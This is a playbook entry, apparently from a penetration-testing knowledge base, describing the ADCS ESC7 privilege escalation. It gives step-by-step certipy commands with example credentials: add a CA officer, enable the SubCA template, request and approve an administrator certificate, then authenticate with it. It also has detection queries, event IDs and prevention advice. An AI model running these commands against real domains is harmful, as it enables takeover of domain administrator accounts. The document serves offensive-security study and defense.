name: ADCS ESC7 - CA Officer / ManageCA Abuse
description: ESC7 exploits ManageCA or ManageCertificates permissions on the CA server. With ManageCA, you can add yourself as a CA Officer and enable the SAN (Subject Alternative Name) flag on templates. With ManageCertificates (Certificate Officer), you can approve pending certificate requests. Combined, these enable requesting certs as any user.
notes:
=== CONDITIONS ===
You have ManageCA or ManageCertificates permission on the CA.

=== STEP 1: ADD YOURSELF AS OFFICER ===
  certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <pass>

=== STEP 2: ENABLE SUBJECTALTNAME FLAG ===
  certipy ca -ca <ca_name> -enable-template SubCA -u <user>@<domain> -p <pass>
  # Or enable SAN on an existing template

=== STEP 3: REQUEST CERT WITH SAN ===
  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template SubCA -upn administrator@<domain>
  # Request will be pending (needs officer approval)

=== STEP 4: APPROVE AS OFFICER ===
  certipy ca -ca <ca_name> -issue-request <request_id> -u <user>@<domain> -p <pass>

=== STEP 5: RETRIEVE AND AUTH ===
  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -retrieve <request_id>
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

=== ALTERNATIVE: ManageCertificates only ===
If you only have ManageCertificates, you can approve pending
requests but not add officers or enable SAN. Look for templates
that already allow SAN or have pending requests.

examples.label: Add yourself as CA Officer
examples.command: certipy ca -ca corp-CA -add-officer jdoe -u jdoe@corp.local -p Password123

examples.label: Request cert with admin SAN
examples.command: certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template SubCA -upn administrator@corp.local

recommended.note: ESC6 enables SAN globally; ESC7 uses officer permissions to enable it per-template.
ForgeCert for persistence after obtaining CA access via ESC7.

defense.why_it_works: ManageCA permission grants control over the CA configuration, including adding Certificate Officers and enabling template flags. ManageCertificates permission allows approving certificate requests that would otherwise be pending.
defense.prerequisites: ManageCA or ManageCertificates permission on the ADCS CA server.
defense.impact: Domain admin compromise by issuing certificates with arbitrary SANs.
defense.detection: [MITRE T1649] CA configuration changes; new officer assignments; certificate approvals for templates that normally require admin.
defense.artifacts: CA audit logs showing officer addition; certificate request and approval events; Event 4886/4887.
defense.splunk_spl:
index=windows source="CertificationAuthority" (EventCode=4890 OR EventCode=4892)
| table _time, EventCode, Message
defense.sentinel_kql:
SecurityEvent
| where EventID in (4890, 4892)
| project TimeGenerated, EventID, EventData
defense.prevention: Restrict ManageCA and ManageCertificates permissions; enable CA audit logging; monitor officer changes; require manager approval for sensitive templates.

detections.name: ESC7 - CA Officer added or certificate issued by new officer
detections.logic:
SecurityEvent
| where EventID in (4890, 4892)
| project TimeGenerated, EventID, EventData
| extend Detail = tostring(EventData)
detections.tuning: Baseline normal CA officer activities; alert on new officer assignments
